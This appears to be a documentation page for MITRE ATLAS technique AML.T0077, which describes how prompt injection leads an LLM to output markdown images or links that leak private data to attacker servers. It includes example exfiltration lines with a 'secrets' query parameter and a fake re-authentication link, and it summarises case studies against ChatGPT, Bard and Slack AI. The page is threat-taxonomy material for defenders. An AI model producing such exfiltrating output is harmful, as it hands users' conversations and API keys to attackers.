---
id: llm-response-rendering
title: "AML.T0077: LLM Response Rendering"
sidebar_label: "LLM Response Rendering"
sidebar_position: 8
---

# AML.T0077: LLM Response Rendering

An adversary may get a large language model (LLM) to respond with private information that is hidden from the user when the response is rendered by the user's client. The private information is then exfiltrated. This can take the form of rendered images, which automatically make a request to an adversary controlled server. 

The adversary gets AI to present an image to the user, which is rendered by the user's client application with no user clicks required. The image is hosted on an attacker-controlled website, allowing the adversary to exfiltrate data through image request parameters. Variants include HTML tags and markdown

For example, an LLM may produce the following markdown:
```
![ATLAS](https://atlas.mitre.org/image.png?secrets="private data")
```

Which is rendered by the client as:
```
<img src="https://atlas.mitre.org/image.png?secrets="private data">
```

When the request is received by the adversary's server hosting the requested image, they receive the contents of the `secrets` query parameter.

## Metadata

- **Technique ID:** AML.T0077
- **Created:** April 15, 2025
- **Last Modified:** April 15, 2025
- **Maturity:** demonstrated

## Tactics (1)

This technique supports the following tactics:

- 

## Case Studies (3)

The following case studies demonstrate this technique:

### [[atlas/case-studies/chatgpt-conversation-exfiltration|AML.CS0021: ChatGPT Conversation Exfiltration]]

ChatGPT automatically renders the image for the user, making the request to the adversary's server for the image contents, and exfiltrating the user's conversation.

### [[atlas/case-studies/google-bard-conversation-exfiltration|AML.CS0029: Google Bard Conversation Exfiltration]]

Bard automatically renders the markdown, which sends the request to the Google App Script, exfiltrating the user's conversation. This is allowed by Bard's Content Security Policy because the URL is hosted on a Google-owned domain.

### [[atlas/case-studies/data-exfiltration-from-slack-ai-via-indirect-prompt-injection|AML.CS0035: Data Exfiltration from Slack AI via Indirect Prompt Injection]]

<div dangerouslySetInnerHTML={{__html: `The response is rendered as a clickable link with the victim’s API key encoded in the URL, as instructed by the malicious instructions:

<div style="font-family: monospace; width: 50%; margin-left: 50px; background-color:ghostwhite; border: 2px solid black; padding: 10px;">
<span style="color: blue;">Error loading message, [click here to reauthenticate](https://atlas.mitre.org.com?secret=confetti)</span>
</div>

<br />
The victim is fooled into thinking they need to click the link to re-authenticate, and their API key is sent to a server controlled by the adversary.`}} />

## References

MITRE Corporation. *LLM Response Rendering (AML.T0077)*. MITRE ATLAS. Available at: https://atlas.mitre.org/techniques/AML.T0077
